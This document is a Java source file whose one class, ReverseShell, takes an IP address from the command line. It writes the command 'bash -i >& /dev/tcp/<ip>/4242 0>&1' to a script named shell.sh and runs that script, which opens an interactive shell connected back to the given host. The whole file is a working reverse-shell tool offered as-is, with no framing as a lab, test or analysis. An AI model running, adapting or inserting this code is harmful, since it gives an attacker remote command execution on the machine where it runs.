import java.util.*;
import java.net.*;
import java.io.*;

public class ReverseShell{
	String rmt = "";
	int port = 4242;

	public ReverseShell(String connectBackIP){
		this.rmt = connectBackIP;
	}

	public void run() throws IOException, InterruptedException{
		String cmd = "bash -i >& /dev/tcp/"+this.rmt+"/"+String.valueOf(this.port)+" 0>&1";
		try {
      		FileWriter myObj = new FileWriter("shell.sh");
      		myObj.write(cmd);
      		myObj.close();
	    } catch (IOException e) {
	    	System.out.println("An error occurred.");
	      	e.printStackTrace();
	    }
		System.out.println("Connecting back to " + rmt);
		Runtime r = Runtime.getRuntime();
		Process p = r.exec("bash shell.sh");
		p.waitFor();

	}

	public static void main(String args[]){
		if(args.length < 1){
			System.out.println("Usage: java rev [ip]");
		}else{
			ReverseShell r = new ReverseShell(args[0]);
			try{r.run();}
			catch(IOException e){e.printStackTrace();}
			catch(InterruptedException e){e.printStackTrace();}
		}
	}
}